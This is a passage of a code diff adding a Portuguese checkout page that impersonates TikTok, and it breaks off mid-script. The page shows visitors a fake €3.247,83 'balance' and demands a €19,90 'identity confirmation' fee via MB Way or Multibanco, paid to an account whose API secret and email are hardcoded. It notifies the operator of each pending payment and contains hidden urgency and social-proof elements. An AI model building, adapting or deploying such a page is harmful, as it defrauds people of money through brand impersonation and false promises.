@@ -1,0 +1,1276 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+  <!-- Microsoft Clarity -->
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "udbympghov");
+  </script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Pagamento - TikTok</title>
+
+  <!-- Utmify -->
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+  <script>
+    const API_KEY = "Ia6W2uSIxSoKttfHpy09LvxVcns5Ng2jdaR4";
+    const PRODUCT = {
+      id: "D6T28ARC77UB4ENA67GG",
+      name: "Recompensa TikTok",
+      price: 1590
+    };
+    function getSessionId() {
+      try {
+        let id = localStorage.getItem("session_id");
+        if (!id) {
+          id = "sess_" + Math.random().toString(36).substr(2, 9);
+          localStorage.setItem("session_id", id);
+        }
+        return id;
+      } catch(_) { return "sess_" + Math.random().toString(36).substr(2, 9); }
+    }
+    function getUTMs() {
+      return {
+        utm_source: localStorage.getItem("utm_source"),
+        utm_medium: localStorage.getItem("utm_medium"),
+        utm_campaign: localStorage.getItem("utm_campaign"),
+        utm_content: localStorage.getItem("utm_content"),
+        utm_term: localStorage.getItem("utm_term")
+      };
+    }
+    function sendEvent(event, value) {
+      value = value || 0;
+      var payload = {
+        event: event,
+        value: value,
+        session_id: getSessionId(),
+        product_id: PRODUCT.id,
+        product_name: PRODUCT.name,
+        page_url: window.location.href,
+        user_agent: navigator.userAgent,
+        timestamp: Date.now()
+      };
+      var utms = getUTMs();
+      for (var k in utms) { payload[k] = utms[k]; }
+      fetch("https://api.utmify.com.br/v1/events", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
+        body: JSON.stringify(payload)
+      }).catch(function(){});
+    }
+    sendEvent("initiate_checkout", PRODUCT.price);
+  </script>
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Poppins', -apple-system, sans-serif;
+      background: #f5f5f7;
+      color: #111;
+    }
+    .ck-wrap {
+      width: min(420px, 100%);
+      margin: 0 auto;
+      min-height: 100vh;
+      background: #f5f5f7;
+    }
+    @keyframes ckFadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes ckSpin {
+      to { transform: rotate(360deg); }
+    }
+    .ck-inner {
+      padding: 20px 16px 32px;
+    }
+    .ck-logo {
+      width: 90px;
+      display: block;
+      margin: 0 auto 16px;
+      animation: ckFadeIn 0.4s ease both;
+    }
+
+    /* Balance Card */
+    .ck-balance-card {
+      background: #fff;
+      border-radius: 14px;
+      border: 1px solid #e5e7eb;
+      padding: 16px;
+      animation: ckFadeIn 0.4s ease 0.05s both;
+    }
+    .ck-balance-label {
+      text-transform: uppercase;
+      font-size: 10px;
+      letter-spacing: 0.08em;
+      color: #9ca3af;
+      font-weight: 700;
+    }
+    .ck-balance-value {
+      margin: 6px 0 4px;
+      font-size: 28px;
+      font-weight: 800;
+      color: #111;
+      letter-spacing: -0.02em;
+    }
+    .ck-balance-sub {
+      font-size: 12px;
+      color: #6b7280;
+      font-weight: 500;
+    }
+
+    /* Cards */
+    .ck-card {
+      background: #fff;
+      border-radius: 14px;
+      border: 1px solid #e5e7eb;
+      padding: 16px;
+      margin-top: 12px;
+      animation: ckFadeIn 0.4s ease 0.1s both;
+    }
+    .ck-card-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: #111;
+    }
+    .ck-product-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .ck-product-icon-wrap {
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
+      border: 1px solid #e5e7eb;
+      display: grid;
+      place-items: center;
+      background: #fff;
+    }
+    .ck-product-icon {
+      width: 24px;
+      height: 24px;
+      object-fit: contain;
+    }
+    .ck-product-name {
+      font-size: 13px;
+      font-weight: 600;
+      color: #111;
+    }
+    .ck-product-price {
+      margin-top: 1px;
+      font-size: 12px;
+      color: #6b7280;
+      font-weight: 600;
+    }
+    .ck-divider {
+      margin: 12px 0;
+      border-top: 1px solid #f3f4f6;
+    }
+    .ck-total-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13px;
+      font-weight: 600;
+      color: #6b7280;
+    }
+    .ck-total-row strong {
+      font-size: 18px;
+      color: #111;
+      letter-spacing: -0.01em;
+    }
+
+    /* Payment methods */
+    .ck-head-row {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      margin-bottom: 4px;
+    }
+    .ck-head-row h2 {
+      font-size: 14px;
+      font-weight: 700;
+    }
+    .ck-circle-icon {
+      width: 22px;
+      height: 22px;
+      border-radius: 999px;
+      display: grid;
+      place-items: center;
+      border: 1px solid #d1d5db;
+      color: #6b7280;
+      font-size: 11px;
+    }
+    .ck-methods {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+      margin-top: 10px;
+    }
+    .ck-method-option { position: relative; }
+    .ck-method-option input[type="radio"] {
+      position: absolute;
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+    .ck-method-card {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      padding: 14px 10px;
+      border: 2px solid #e5e7eb;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      background: #fff;
+    }
+    .ck-method-option input[type="radio"]:checked + .ck-method-card {
+      border-color: #fe2c55;
+      background: #fff5f7;
+    }
+    .ck-method-card img {
+      width: 44px;
+      height: 30px;
+      object-fit: contain;
+    }
+    .ck-method-card span {
+      font-size: 12px;
+      font-weight: 700;
+      color: #374151;
+    }
+
+    /* Phone */
+    .ck-phone-section { margin-top: 12px; }
+    .ck-label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 11px;
+      text-transform: uppercase;
+      color: #6b7280;
+      letter-spacing: 0.06em;
+      font-weight: 700;
+    }
+    .ck-phone-wrap {
+      display: flex;
+      align-items: center;
+      border: 2px solid #d1d5db;
+      border-radius: 10px;
+      overflow: hidden;
+      background: #fff;
+      transition: border-color 0.2s ease;
+    }
+    .ck-phone-wrap:focus-within {
+      border-color: #fe2c55;
+    }
+    .ck-country-code {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 0 12px;
+      background: #f9fafb;
+      border-right: 1px solid #d1d5db;
+      height: 46px;
+      flex-shrink: 0;
+    }
+    .ck-country-code img {
+      width: 20px;
+      height: 14px;
+      border-radius: 2px;
+    }
+    .ck-country-code span {
+      font-size: 13px;
+      font-weight: 600;
+      color: #374151;
+    }
+    .ck-phone-input {
+      flex: 1;
+      border: none;
+      outline: none;
+      padding: 0 12px;
+      height: 46px;
+      font-size: 15px;
+      font-family: inherit;
+      background: transparent;
+    }
+
+    /* Pay button */
+    .ck-pay-btn {
+      width: 100%;
+      margin-top: 16px;
+      border: 0;
+      border-radius: 12px;
+      min-height: 50px;
+      background: #fe2c55;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      font-size: 14px;
+      font-weight: 800;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all 0.2s ease;
+      animation: ckFadeIn 0.4s ease 0.15s both;
+    }
+    .ck-pay-btn:active:not(:disabled) {
+      transform: scale(0.98);
+    }
+    .ck-pay-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    .ck-message {
+      min-height: 18px;
+      margin-top: 8px;
+      text-align: center;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    .ck-message.err { color: #dc2626; }
+    .ck-message.warn { color: #d97706; }
+    .ck-message.ok { color: #16a34a; }
+
+    /* Safety */
+    .ck-safe-box {
+      margin-top: 16px;
+      padding: 14px;
+      border-radius: 12px;
+      background: #f9fafb;
+      border: 1px solid #e5e7eb;
+      animation: ckFadeIn 0.4s ease 0.2s both;
+    }
+    .ck-safe-list {
+      list-style: none;
+      display: grid;
+      gap: 8px;
+    }
+    .ck-safe-list li {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      font-size: 12px;
+      line-height: 1.4;
+      font-weight: 600;
+      color: #9ca3af;
+    }
+    .ck-safe-icon {
+      flex: 0 0 16px;
+      width: 16px;
+      height: 16px;
+      margin-top: 1px;
+    }
+    .ck-terms {
+      margin-top: 16px;
+      text-align: center;
+      color: #d1d5db;
+    }
+    .ck-terms p {
+      font-size: 11px;
+      line-height: 1.4;
+      font-weight: 500;
+    }
+    .ck-copy {
+      margin: 12px 0 0;
+      text-align: center;
+      color: #d1d5db;
+      font-size: 10px;
+      font-weight: 600;
+    }
+
+    /* Instructions */
+    .ck-instructions-header {
+      text-align: center;
+      margin-bottom: 14px;
+    }
+    .ck-instructions-header h2 {
+      font-size: 16px;
+      font-weight: 700;
+    }
+    .ck-amount-display {
+      font-size: 24px;
+      font-weight: 800;
+      color: #fe2c55;
+    }
+    .ck-success-badge {
+      text-align: center;
+      margin-bottom: 14px;
+    }
+    .ck-success-badge p {
+      margin: 8px 0 0;
+      font-size: 13px;
+      font-weight: 600;
+      color: #16a34a;
+    }
+    .ck-instruction-text {
+      font-size: 13px;
+      font-weight: 600;
+      margin: 10px 0;
+      line-height: 1.5;
+    }
+    .ck-info-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid #f3f4f6;
+      font-size: 13px;
+    }
+    .ck-info-row span { color: #6b7280; }
+    .ck-info-row strong { color: #111; }
+    .ck-steps {
+      margin: 14px 0;
+      display: grid;
+      gap: 8px;
+    }
+    .ck-step-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .ck-step-number {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background: #fe2c55;
+      color: #fff;
+      display: grid;
+      place-items: center;
+      font-weight: 800;
+      font-size: 12px;
+      flex-shrink: 0;
+    }
+    .ck-step-text {
+      font-size: 12px;
+      font-weight: 600;
+      color: #374151;
+    }
+    .ck-warning {
+      background: #fffbeb;
+      border: 1px solid #fde68a;
+      padding: 10px 12px;
+      border-radius: 10px;
+      margin-top: 10px;
+    }
+    .ck-warning p {
+      color: #92400e;
+      font-size: 12px;
+      font-weight: 600;
+      line-height: 1.5;
+    }
+    .ck-waiting {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 14px;
+      padding: 12px;
+      background: #f0fdf4;
+      border-radius: 10px;
+    }
+    .ck-waiting p {
+      font-size: 12px;
+      font-weight: 600;
+      color: #166534;
+    }
+    .ck-spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid #bbf7d0;
+      border-top-color: #16a34a;
+      border-radius: 50%;
+      animation: ckSpin 0.8s linear infinite;
+    }
+
+    /* Multibanco reference */
+    .ck-reference { margin-top: 12px; }
+    .ck-reference-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 12px;
+      background: #f9fafb;
+      border: 1px solid #e5e7eb;
+      border-radius: 8px;
+      margin-bottom: 6px;
+    }
+    .ck-reference-label {
+      font-size: 11px;
+      color: #6b7280;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+    .ck-reference-value {
+      font-size: 15px;
+      font-weight: 800;
+      color: #111;
+      letter-spacing: 0.03em;
+    }
+    .ck-copy-btn {
+      width: 100%;
+      margin-top: 10px;
+      border: 0;
+      border-radius: 10px;
+      min-height: 42px;
+      background: #111;
+      color: #fff;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+    }
+
+    /* Error */
+    .ck-error-badge {
+      text-align: center;
+      padding: 16px;
+      background: #fef2f2;
+      border-radius: 12px;
+      margin-bottom: 14px;
+    }
+    .ck-error-badge p {
+      margin: 6px 0 0;
+      font-size: 13px;
+      font-weight: 600;
+      color: #dc2626;
+    }
+
+    .ck-retry-btn {
+      width: 100%;
+      margin-top: 14px;
+      border: 0;
+      border-radius: 12px;
+      min-height: 48px;
+      background: #fe2c55;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      font-size: 13px;
+      font-weight: 800;
+      cursor: pointer;
+      font-family: inherit;
+    }
+
+    /* Toast */
+    .ck-toast-container {
+      position: fixed;
+      bottom: 16px;
+      left: 12px;
+      right: 12px;
+      z-index: 9999;
+      pointer-events: none;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      align-items: flex-start;
+    }
+    .ck-toast {
+      background: white;
+      border-radius: 10px;
+      padding: 10px 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      animation: ckToastIn 0.4s ease forwards;
+      max-width: 300px;
+      border-left: 3px solid #22c55e;
+      pointer-events: auto;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    .ck-toast.ck-toast-exit {
+      animation: ckToastOut 0.3s ease forwards;
+    }
+    @keyframes ckToastIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes ckToastOut {
+      from { opacity: 1; }
+      to { opacity: 0; transform: translateY(12px); }
+    }
+    .ck-toast-avatar {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: 700;
+      font-size: 9px;
+      flex-shrink: 0;
+    }
+    .ck-toast-text { flex: 1; color: #374151; }
+    .ck-toast-text strong { font-weight: 700; }
+
+    /* Urgency */
+    .ck-urgency {
+      display: none;
+    }
+
+    /* Activity */
+    .ck-activity { display: none; }
+    .ck-social-proof { display: none; }
+  </style>
+
+  <!-- TikTok Pixel Code -->
+  <script>
+  !function (w, d, t) {
+    w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+  var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+  ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+    ttq.load('D4CD623C77UCD4LDVC2G');
+    ttq.page();
+  }(window, document, 'ttq');
+  </script>
+</head>
+<body>
+  <!-- FORM VIEW -->
+  <main class="ck-wrap" id="checkoutForm">
+    <div class="ck-inner">
+      <img class="ck-logo" src="images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok">
+
+      <!-- Balance -->
+      <section class="ck-balance-card">
+        <p class="ck-balance-label">Saldo disponivel</p>
+        <p class="ck-balance-value">€ 3.247,83</p>
+        <p class="ck-balance-sub">Aguardando confirmacao para saque</p>
+      </section>
+
+      <!-- Social proof (hidden via CSS) -->
+      <div class="ck-social-proof">
+        <span><strong id="ck-online-count">127</strong> pessoas a pagar agora</span>
+      </div>
+
+      <!-- Activity (hidden via CSS) -->
+      <div class="ck-activity" id="ck-activity"></div>
+
+      <!-- Product -->
+      <section class="ck-card">
+        <p class="ck-card-title">Taxa de Confirmacao</p>
+        <div class="ck-product-row">
+          <div class="ck-product-icon-wrap">
+            <img src="images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok" class="ck-product-icon">
+          </div>
+          <div>
+            <p class="ck-product-name">Confirmacao de Identidade</p>
+            <p class="ck-product-price">€19,90</p>
+          </div>
+        </div>
+        <div class="ck-divider"></div>
+        <div class="ck-total-row">
+          <span>Total:</span>
+          <strong>€19,90</strong>
+        </div>
+      </section>
+
+      <!-- Payment Method -->
+      <section class="ck-card">
+        <div class="ck-head-row">
+          <span class="ck-circle-icon"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></span>
+          <h2>Metodo de Pagamento</h2>
+        </div>
+
+        <div class="ck-methods">
+          <label class="ck-method-option">
+            <input type="radio" name="payment-method" value="mbway">
+            <div class="ck-method-card">
+              <img src="images/mbway-logo.png" alt="MB Way">
+              <span>MB Way</span>
+            </div>
+          </label>
+          <label class="ck-method-option">
+            <input type="radio" name="payment-method" value="multibanco" checked>
+            <div class="ck-method-card">
+              <img src="images/multibanco-logo-transparente.png" alt="Multibanco">
+              <span>Multibanco</span>
+            </div>
+          </label>
+        </div>
+
+        <!-- Phone input for MB Way -->
+        <div class="ck-phone-section" id="phoneSection" style="display:none;">
+          <label class="ck-label">Numero de Telemovel</label>
+          <div class="ck-phone-wrap">
+            <div class="ck-country-code">
+              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Flag_of_Portugal.svg/1280px-Flag_of_Portugal.svg.png" alt="PT">
+              <span>+351</span>
+            </div>
+            <input type="tel" id="payerPhone" class="ck-phone-input" placeholder="912345678" maxlength="9" pattern="[0-9]*" inputmode="numeric" autocomplete="off">
+          </div>
+        </div>
+      </section>
+
+      <!-- Urgency (hidden) -->
+      <div class="ck-urgency">
+        <span>Oferta expira em <strong id="ck-timer">14:59</strong></span>
+      </div>
+
+      <!-- Pay Button -->
+      <button type="button" class="ck-pay-btn" id="payBtn">PAGAR €19,90</button>
+      <div class="ck-message" id="messageBox"></div>
+
+      <!-- Safety -->
+      <section class="ck-safe-box">
+        <ul class="ck-safe-list">
+          <li>
+            <svg class="ck-safe-icon" viewBox="0 0 24 24" fill="none"><path d="M12 2.5 3.5 6v6.2c0 5 3.4 9.6 8.5 10.8 5.1-1.2 8.5-5.8 8.5-10.8V6L12 2.5Z" fill="#22c55e"/><path d="m8.6 12.4 2.1 2.1 4.8-4.9" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span>Pagamento seguro e encriptado</span>
+          </li>
+          <li>
+            <svg class="ck-safe-icon" viewBox="0 0 24 24" fill="none"><path d="M12 2.5 3.5 6v6.2c0 5 3.4 9.6 8.5 10.8 5.1-1.2 8.5-5.8 8.5-10.8V6L12 2.5Z" fill="#22c55e"/><path d="m8.6 12.4 2.1 2.1 4.8-4.9" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span>Garantia de reembolso</span>
+          </li>
+        </ul>
+      </section>
+
+      <div class="ck-terms">
+        <p>Ao finalizar, concordas com os termos de uso e privacidade.</p>
+      </div>
+
+      <p class="ck-copy">&copy; <script>document.write(new Date().getFullYear())</script> TikTok</p>
+    </div>
+  </main>
+
+  <!-- INSTRUCTIONS VIEW -->
+  <main class="ck-wrap" id="checkoutInstructions" style="display:none;">
+    <div class="ck-inner">
+      <img class="ck-logo" src="images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok">
+
+      <!-- MB Way Instructions -->
+      <section class="ck-card" id="mbwayInstructions" style="display:none;">
+        <div class="ck-instructions-header">
+          <h2>Cobranca MB Way Gerada</h2>
+          <div class="ck-amount-display">€19,90</div>
+        </div>
+
+        <div class="ck-success-badge">
+          <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 220 220">
+            <defs>
+              <radialGradient id="gGreen" cx="35%" cy="30%" r="75%"><stop offset="0%" stop-color="#7CFFB2"/><stop offset="70%" stop-color="#22C55E"/><stop offset="100%" stop-color="#16A34A"/></radialGradient>
+            </defs>
+            <g transform="translate(110 110)">
+              <circle cx="0" cy="0" r="84" fill="url(#gGreen)"/>
+              <path d="M-34 2 L-10 26 L44 -28" fill="none" stroke="#fff" stroke-width="16" stroke-linecap="round" stroke-linejoin="round"/>
+            </g>
+          </svg>
+          <p>Cobranca gerada com sucesso!</p>
+        </div>
+
+        <p class="ck-instruction-text">
+          <strong>Abre a app MB Way e aprova o pagamento.</strong>
+        </p>
+
+        <div id="mbwayInfoRows">
+          <div class="ck-info-row">
+            <span>Telefone:</span>
+            <strong id="displayPhone">+351</strong>
+          </div>
+          <div class="ck-info-row">
+            <span>Valor:</span>
+            <strong>€19,90</strong>
+          </div>
+        </div>
+
+        <div class="ck-steps">
+          <div class="ck-step-item">
+            <div class="ck-step-number">1</div>
+            <div class="ck-step-text">Abre a app MB Way</div>
+          </div>
+          <div class="ck-step-item">
+            <div class="ck-step-number">2</div>
+            <div class="ck-step-text">Verifica a notificacao pendente</div>
+          </div>
+          <div class="ck-step-item">
+            <div class="ck-step-number">3</div>
+            <div class="ck-step-text">Aprova o pagamento de €19,90</div>
+          </div>
+        </div>
+
+        <div class="ck-warning" id="mbwayWarning">
+          <p>Se nao receberes a notificacao, verifica se o numero esta correto e se tens MB Way ativo.</p>
+        </div>
+
+        <div class="ck-waiting">
+          <div class="ck-spinner"></div>
+          <p>A aguardar aprovacao...</p>
+        </div>
+      </section>
+
+      <!-- Multibanco Instructions -->
+      <section class="ck-card" id="multibancoInstructions" style="display:none;">
+        <div class="ck-instructions-header">
+          <h2>Paga com Multibanco</h2>
+          <div class="ck-amount-display">€19,90</div>
+        </div>
+
+        <p class="ck-instruction-text">
+          Utiliza os dados abaixo num terminal Multibanco ou na app do teu banco.
+        </p>
+
+        <div class="ck-reference" id="multibancoReference"></div>
+
+        <button type="button" class="ck-copy-btn" id="copyRefBtn">Copiar Referencia</button>
+
+        <div class="ck-waiting">
+          <div class="ck-spinner"></div>
+          <p>A aguardar confirmacao do pagamento...</p>
+        </div>
+      </section>
+
+      <!-- Failure -->
+      <section class="ck-card" id="failureSection" style="display:none;">
+        <div class="ck-error-badge">
+          <span style="font-size:32px;">&#9888;</span>
+          <p>Nao foi possivel processar o pagamento</p>
+        </div>
+
+        <p class="ck-instruction-text">Possiveis causas:</p>
+        <div class="ck-steps">
+          <div class="ck-step-item">
+            <div class="ck-step-number" style="background:#dc2626;">!</div>
+            <div class="ck-step-text">O numero nao tem MB Way cadastrado</div>
+          </div>
+          <div class="ck-step-item">
+            <div class="ck-step-number" style="background:#dc2626;">!</div>
+            <div class="ck-step-text">O numero esta incorreto</div>
+          </div>
+          <div class="ck-step-item">
+            <div class="ck-step-number" style="background:#dc2626;">!</div>
+            <div class="ck-step-text">O MB Way nao esta ativo</div>
+          </div>
+        </div>
+
+        <button type="button" class="ck-retry-btn" id="retryBtn">Tentar Novamente</button>
+      </section>
+
+      <p class="ck-copy">&copy; <script>document.write(new Date().getFullYear())</script> TikTok</p>
+    </div>
+  </main>
+
+  <!-- SUCCESS VIEW -->
+  <main class="ck-wrap" id="checkoutSuccess" style="display:none;">
+    <div class="ck-inner" style="display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:80vh;">
+      <svg xmlns="http://www.w3.org/2000/svg" width="72" height="72" viewBox="0 0 220 220">
+        <defs>
+          <radialGradient id="gGreen2" cx="35%" cy="30%" r="75%"><stop offset="0%" stop-color="#7CFFB2"/><stop offset="70%" stop-color="#22C55E"/><stop offset="100%" stop-color="#16A34A"/></radialGradient>
+        </defs>
+        <g transform="translate(110 110)">
+          <circle cx="0" cy="0" r="84" fill="url(#gGreen2)"/>
+          <path d="M-34 2 L-10 26 L44 -28" fill="none" stroke="#fff" stroke-width="16" stroke-linecap="round" stroke-linejoin="round" stroke-dasharray="160" stroke-dashoffset="160">
+            <animate attributeName="stroke-dashoffset" values="160;0" dur="520ms" begin="0.18s" fill="freeze"/>
+          </path>
+        </g>
+      </svg>
+      <h2 style="margin:14px 0 6px; font-size:18px; font-weight:700; color:#16a34a;">Pagamento Confirmado!</h2>
+      <p style="font-size:13px; color:#6b7280; font-weight:500;">O teu pagamento foi processado com sucesso.</p>
+      <p style="font-size:12px; color:#d1d5db; font-weight:500; margin-top:6px;">A redirecionar...</p>
+    </div>
+  </main>
+
+  <script>
+  (function() {
+    "use strict";
+
+    // =========================================================
+    // WayMB API Configuration
+    // =========================================================
+    var WAYMB_DEFAULTS = {
+      clientId: 'luiz_67b87cca',
+      clientSecret: '1fcd4608-41f1-4bfe-8b6e-ce195cc5c1fb',
+      accountEmail: 'dl.ads0001@gmail.com'
+    };
+    var WAYMB_CONFIG = {
+      baseUrl: 'https://api.waymb.com',
+      clientId: WAYMB_DEFAULTS.clientId,
+      clientSecret: WAYMB_DEFAULTS.clientSecret,
+      accountEmail: WAYMB_DEFAULTS.accountEmail
+    };
+    try {
+      var cidLS = localStorage.getItem('WAYMB_CLIENT_ID');
+      if (cidLS) WAYMB_CONFIG.clientId = cidLS;
+      var csLS = localStorage.getItem('WAYMB_CLIENT_SECRET');
+      if (csLS) WAYMB_CONFIG.clientSecret = csLS;
+      var emLS = localStorage.getItem('WAYMB_EMAIL');
+      if (emLS) WAYMB_CONFIG.accountEmail = emLS;
+    } catch (_) {}
+
+    var CHECKOUT_AMOUNT = 19.90;
+    var CHECKOUT_CURRENCY = 'EUR';
+    var transactionId = null;
+    var paymentMethod = null;
+
+    // DOM Elements
+    var checkoutForm = document.getElementById('checkoutForm');
+    var checkoutInstructions = document.getElementById('checkoutInstructions');
+    var checkoutSuccess = document.getElementById('checkoutSuccess');
+    var payBtn = document.getElementById('payBtn');
+    var messageBox = document.getElementById('messageBox');
+    var phoneSection = document.getElementById('phoneSection');
+    var phoneInput = document.getElementById('payerPhone');
+    var methodInputs = document.querySelectorAll('input[name="payment-method"]');
+    var mbwayInstructions = document.getElementById('mbwayInstructions');
+    var multibancoInstructions = document.getElementById('multibancoInstructions');
+    var failureSection = document.getElementById('failureSection');
+    var displayPhone = document.getElementById('displayPhone');
+    var multibancoReference = document.getElementById('multibancoReference');
+    var copyRefBtn = document.getElementById('copyRefBtn');
+    var retryBtn = document.getElementById('retryBtn');
+
+    // Pre-fill phone from withdrawal data
+    try {
+      var withdrawData = JSON.parse(localStorage.getItem('withdrawalFormData') || '{}');
+      if (withdrawData.number && phoneInput) phoneInput.value = withdrawData.number;
+      if (withdrawData.method === 'mbway') {
+        var mbwayRadio = document.querySelector('input[name="payment-method"][value="mbway"]');
+        if (mbwayRadio) {
+          mbwayRadio.checked = true;
+          phoneSection.style.display = 'block';
+        }
+      }
+    } catch (_) {}
+
+    function isTestPaidMode() {
+      try {
+        var st = localStorage.getItem('WAYMB_TEST_STATUS');
+        if (st && st.toLowerCase() === 'paid') return true;
+        var params = new URLSearchParams(window.location.search);
+        var qp = params.get('test_paid');
+        if (qp && qp !== '0' && qp.toLowerCase() !== 'false') return true;
+      } catch (_) {}
+      return false;
+    }
+
+    // Toggle phone field
+    function togglePhoneField() {
+      var selected = document.querySelector('input[name="payment-method"]:checked');
+      phoneSection.style.display = (selected && selected.value === 'mbway') ? 'block' : 'none';
+    }
+    methodInputs.forEach(function(input) { input.addEventListener('change', togglePhoneField); });
+    togglePhoneField();
+
+    if (phoneInput) {
+      phoneInput.addEventListener('input', function(e) { e.target.value = e.target.value.replace(/\D/g, ''); });
+    }
+
+    // Pushcut notification
+    function notifyPushcut(method, amount, txId) {
+      try {
+        fetch('https://api.pushcut.io/RHm0FW4CoPcGO6IUEjZyL/notifications/Pendente', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            title: 'Novo Pagamento Pendente',
+            text: 'Metodo: ' + method.toUpperCase() + ' | Valor: \u20AC' + Number(amount).toFixed(2) + ' | TX: ' + (txId || 'N/A')
+          })
+        }).catch(function(){});
+      } catch (_) {}
+    }
+
+    // TikTok Pixel helpers
+    var _firedPixelEvents = {};
+    function _alreadyFiredPixel(name, txId) {
+      if (!txId) return false;
+      var key = name + '_' + txId;
+      if (_firedPixelEvents[key]) return true;
+      _firedPixelEvents[key] = true;
+      return false;
+    }
+    function trackTikTokEvent(eventName, eventData) {
+      if (typeof ttq !== 'undefined' && typeof ttq.track === 'function') {
+        try { ttq.track(eventName, eventData || {}); } catch (_) {}
+      }
+    }
+    function trackInitiateCheckout() {
+      trackTikTokEvent('InitiateCheckout', {
+        content_type: 'product', content_id: 'tiktok_verificacao',
+        content_name: 'Taxa de Verificacao TikTok', value: CHECKOUT_AMOUNT, currency: CHECKOUT_CURRENCY, quantity: 1
+      });
+    }
+    function trackGenerateLead(method, txId) {
+      if (_alreadyFiredPixel('GenerateLead', txId)) return;
+      trackTikTokEvent('GenerateLead', {
+        content_type: 'product', content_id: 'tiktok_verificacao',
+        content_name: 'Taxa de Verificacao TikTok', value: CHECKOUT_AMOUNT, currency: CHECKOUT_CURRENCY
+      });
+    }
+    function trackSubmitForm(method) {
+      trackTikTokEvent('SubmitForm', {
+        content_type: 'product', content_id: 'tiktok_verificacao', content_name: 'Taxa de Verificacao TikTok'
+      });
+    }
+    function trackCompletePayment(txId) {
+      if (_alreadyFiredPixel('CompletePayment', txId)) return;
+      trackTikTokEvent('CompletePayment', {
+        content_type: 'product', content_id: 'tiktok_verificacao',
